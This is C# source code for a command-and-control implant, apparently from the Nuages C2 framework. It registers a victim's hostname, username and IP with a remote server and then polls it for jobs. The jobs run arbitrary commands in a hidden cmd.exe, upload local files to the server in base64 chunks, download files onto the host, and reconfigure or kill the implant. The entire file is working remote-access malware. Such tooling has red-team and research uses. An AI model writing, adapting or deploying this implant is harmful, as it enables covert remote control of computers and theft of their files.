using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using Newtonsoft.Json.Linq;

namespace NuagesSharpImplant
{
    public interface NuagesC2Connector
    {
        string getConnectionString();

        string getHandler();

        string RegisterImplant(string hostname = "", string username = "", string localIp = "", string sourceIp = "", string os = "", string handler = "", string connectionString = "", Dictionary<string, string> options = null, String[] supportedPayloads = null);

        void SubmitJobResult(string jobId, string result = "", bool moreData = false, bool error = false, int n = 0, string data = "");

        JArray Heartbeat(string implantId);

        string GetFileChunk(string fileId, int n);

    }

    public class NuagesC2Direct: NuagesC2Connector
    {
        private string connectionString;

        private string handler = "Direct";

        public NuagesC2Direct(string connectionString)
        {
            this.connectionString = connectionString;
        }

        public string getConnectionString() {
            return this.connectionString;
        }

        public string getHandler()
        {
            return this.handler;
        }

        string POST(string url, string jsonContent)
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
            request.Method = "POST";

            System.Text.UTF8Encoding encoding = new System.Text.UTF8Encoding();
            Byte[] byteArray = encoding.GetBytes(jsonContent);

            request.ContentLength = byteArray.Length;
            request.ContentType = @"application/json";

            using (Stream dataStream = request.GetRequestStream())
            {
                dataStream.Write(byteArray, 0, byteArray.Length);
            }
            
            using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
            {
                using (Stream responseStream = response.GetResponseStream())
                {
                    StreamReader reader = new StreamReader(responseStream, System.Text.Encoding.GetEncoding("utf-8"));
                    return reader.ReadToEnd();
                }
            }
        }
        public void SubmitJobResult(string jobId, string result = "", bool moreData = false, bool error = false, int n = 0, string data = "")
        {
            JObject body = new JObject(
                new JProperty("n", n),
                new JProperty("moreData", moreData),
                new JProperty("error", error),
                new JProperty("result", result),
                new JProperty("jobId", jobId),
                new JProperty("data", data)
            );
            this.POST(this.connectionString + "/implant/jobresult", body.ToString());
        }

        public string RegisterImplant(string hostname = "", string username = "",  string localIp = "", string sourceIp = "", string os = "", string handler = "", string connectionString = "", Dictionary<string, string> options = null, String[] supportedPayloads = null)
        {
            JObject body = new JObject(
                new JProperty("hostname", hostname),
                new JProperty("username", username),
                new JProperty("localIp", localIp),
                new JProperty("sourceIp", sourceIp),
                new JProperty("os", os),
                new JProperty("handler", handler),
                new JProperty("connectionString", connectionString),
                new JProperty("options", JObject.FromObject(options)),
                new JProperty("supportedPayloads", JArray.FromObject(supportedPayloads))
            );
            JObject response = JObject.Parse(this.POST(this.connectionString + "/implant/register", body.ToString()));
            return response["_id"].ToString();
        }

        public JArray Heartbeat(string implantId) {
            JObject body = new JObject(
                new JProperty("id", implantId)
            );
            JObject response = JObject.Parse(this.POST(this.connectionString + "/implant/heartbeat", body.ToString()));
            return (JArray)response["data"];
        }

        public string GetFileChunk(string fileId, int n) {
            JObject body = new JObject(
                new JProperty("n", n),
                new JProperty("file_id", fileId)
            );

            JObject response = JObject.Parse(this.POST(this.connectionString + "/implant/chunks", body.ToString()));
            try
            {
                return response["data"].ToString();
            }
            catch {
                return "";
            }
        }
    }

    public class NuagesC2Implant
    {
        private Dictionary<string, string> config;
        private string hostname;
        private string username;
        private string localIp;
        private string os;
        private string handler;
        private string connectionString;
        private NuagesC2Connector connector;
        private Dictionary<string, string> options;
        String[] supportedPayloads;
        JArray jobs;

        public string GetLocalIPv4()
        {
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                {
                    return ip.ToString();
                }
            }
            throw new Exception("No network adapters with an IPv4 address in the system!");
        }


        public NuagesC2Implant(Dictionary<string, string> config, NuagesC2Connector connector)
        {
            this.jobs = new JArray();

            this.config = config;

            this.connector = connector;

            try
            {
                this.hostname = Dns.GetHostName();
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
                this.hostname = "";
            }

            try
            {
                this.localIp = GetLocalIPv4();
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
                this.localIp = "";
            }
            try
            {
                this.username = Environment.UserName;
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
                this.username = "";
            }

            this.os = "windows";

            this.connectionString = connector.getConnectionString();

            this.supportedPayloads = new string[5];

            this.supportedPayloads[0] = "Command";

            this.supportedPayloads[1] = "Exit";

            this.supportedPayloads[2] = "Download";

            this.supportedPayloads[3] = "Upload";

            this.supportedPayloads[4] = "Configure";

            this.handler = connector.getHandler();

            this.options = new Dictionary<string, string>();
        }

        public void Register()
        {
            while (!this.config.ContainsKey("id"))
            {
                try {
                    this.config["id"] = connector.RegisterImplant(hostname: this.hostname, username: this.username, localIp: this.localIp, os: this.os, handler: this.handler, connectionString: this.connectionString, options: this.options, supportedPayloads: this.supportedPayloads);
                    System.Threading.Thread.Sleep(1000 * Int32.Parse(this.config["sleep"]));
                }
                catch (Exception e){
                    Console.WriteLine(e);
                    System.Threading.Thread.Sleep(5000);
                }
            }
            return;
        }

        public void Heartbeat() {
            this.jobs = this.connector.Heartbeat(this.config["id"]);
        }

        public string GetFileChunk(string fileId, int n)
        {
            return this.connector.GetFileChunk(fileId, n);
        }

        public void ExecuteJob(JObject job)
        {
            string jobId = job.GetValue("_id").ToString();
            try
            {
                string jobType = job.SelectToken("payload.type").ToString();
                if (jobType == "Command")
                {
                    string cmd = job.SelectToken("payload.options.cmd").ToString();
                    string path = ".";
                    try
                    {
                        path = job.SelectToken("payload.options.path").ToString();
                    }
                    catch { }
                    Directory.SetCurrentDirectory(path);
                    System.Diagnostics.Process pProcess = new System.Diagnostics.Process();
                    pProcess.StartInfo.FileName = "cmd.exe";
                    pProcess.StartInfo.Arguments = " /C " + cmd;
                    pProcess.StartInfo.UseShellExecute = false;
                    pProcess.StartInfo.RedirectStandardOutput = true;
                    pProcess.StartInfo.RedirectStandardError = true;
                    pProcess.StartInfo.CreateNoWindow = true;
                    pProcess.Start();
                    string strOutput = pProcess.StandardOutput.ReadToEnd();
                    string strError = pProcess.StandardError.ReadToEnd();
                    pProcess.WaitForExit();
                    bool hasError = (pProcess.ExitCode != 0);
                    string result = strOutput + strError;
                    int n = 0;
                    int maxrequestsize = 5000;
                    try
                    {
                        maxrequestsize = Int32.Parse(this.config["maxrequestsize"]);
                    }
                    catch { }
                    for (n = 0; (n + 1) * maxrequestsize < result.Length; n++)
                    {
                        this.connector.SubmitJobResult(jobId: jobId, result: result.Substring(n * maxrequestsize, maxrequestsize), moreData: true, error: hasError, n: n);
                    }
                    this.connector.SubmitJobResult(jobId: jobId, result: result.Substring(n * maxrequestsize, result.Length - (n * maxrequestsize)), moreData: false, error: hasError, n: n);
                }
                else if (jobType == "Configure")
                {
                    JObject config = (JObject)job.SelectToken("payload.options.config");
                    foreach (var x in config)
                    {
                        this.config[x.Key] = x.Value.ToString();
                    }
                    SubmitJobResult(jobId: jobId, result: Newtonsoft.Json.JsonConvert.SerializeObject(this.config), moreData: false, error: false);
                }
                else if (jobType == "Exit")
                {
                    SubmitJobResult(jobId: jobId, result: "Bye bye!", moreData: false, error: false);
                    System.Environment.Exit(0);
                }
                else if (jobType == "Download")
                {
                    string path = ".";
                    try
                    {
                        path = job.SelectToken("payload.options.path").ToString();
                    }
                    catch { }
                    Directory.SetCurrentDirectory(path);
                    string file = job.SelectToken("payload.options.file").ToString();
                    
                    int n = 0;
                    int chunkSize = Int32.Parse(job.SelectToken("payload.options.chunkSize").ToString());
                    int length = Int32.Parse(job.SelectToken("payload.options.length").ToString());
                    string fileId = job.SelectToken("payload.options.file_id").ToString();
                    using (FileStream fs = new FileStream(file, System.IO.FileMode.Create))
                    {
                        while (n * chunkSize < length)
                        {
                            byte[] buffer = System.Convert.FromBase64String(GetFileChunk(fileId, n));
                            fs.Write(buffer, 0, buffer.Length);
                            n++;
                        }
                        SubmitJobResult(jobId: jobId, result: fs.Name, moreData: false, error: false);
                    }
                }
                else if (jobType == "Upload")
                {
                    string path = ".";
                    try
                    {
                        path = job.SelectToken("payload.options.path").ToString();
                    }
                    catch { }
                    Directory.SetCurrentDirectory(path);
                    string file = job.SelectToken("payload.options.file").ToString();
                    int chunkSize = Int32.Parse(job.SelectToken("payload.options.chunkSize").ToString()) * 3/4;
                    byte[] buffer = new byte[chunkSize];
                    int bytesRead = 0;
                    string b64;
                    string result = "";
                    using (FileStream fs = new FileStream(file, System.IO.FileMode.Open))
                    {
                        int n = 0;
                        bool moreData = true;
                        while (moreData)
                        {
                            bytesRead = fs.Read(buffer, 0, chunkSize);
                            b64 = System.Convert.ToBase64String(buffer, 0, bytesRead);
                            moreData = (fs.Position != fs.Length);
                            if (!moreData) {
                                result = fs.Name;
                            }
                            SubmitJobResult(jobId: jobId, data: b64, moreData: moreData, result: result, error: false, n: n);
                            n++;
                        }
                        
                    }
                }
                else
                {
                    throw new Exception("Payload type not supported");
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
                SubmitJobResult(jobId: jobId, result: e.Message, moreData: false, error: true);
            }

        }

        private void SubmitJobResult(string jobId, string result = "", bool moreData = false, bool error = false, int n = 0, string data = "")
        {
            this.connector.SubmitJobResult(jobId: jobId, result: result, moreData: moreData, error: error, n: n, data: data);
        }

        public void Start()
        {
            this.Register();
            int sleep = 5000;
            while (true)
            {
                try
                {
                    try
                    {
                        sleep = 1000 * Int32.Parse(this.config["sleep"]);
                    }
                    catch {
                        sleep = 5000;
                    }
                    System.Threading.Thread.Sleep(sleep);
                    this.Heartbeat();
                    foreach (JObject job in this.jobs)
                    {
                        System.Threading.Thread thread = new System.Threading.Thread(() => this.ExecuteJob(job));
                        thread.Start();
                    }
                }
                catch (WebException ex)
                {
                    Console.WriteLine(ex);
                    if (ex.Status == WebExceptionStatus.ProtocolError && ex.Response != null)
                    {
                        var resp = (HttpWebResponse)ex.Response;
                        if (resp.StatusCode == HttpStatusCode.NotFound)
                        {
                            this.config.Remove("id");
                            this.Register();
                        }
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine(e);
                }
            }

        }
    }

    class Program
    {
    static void Main(string[] args)
        {
            NuagesC2Direct connector = new NuagesC2Direct("http://127.0.0.1:3333");

            // If the PyAES256 Handler is used:
            // NuagesC2PyAES256 connector = new NuagesC2PyAES256("http://192.168.49.1:4040", "PASSWORD");

            Dictionary<string, string> config = new Dictionary<string, string>();

            config["sleep"] = "1";

            config["maxrequestsize"] = "50000";

            NuagesC2Implant implant = new NuagesC2Implant(config, connector);

            implant.Start();
        }
    }
}
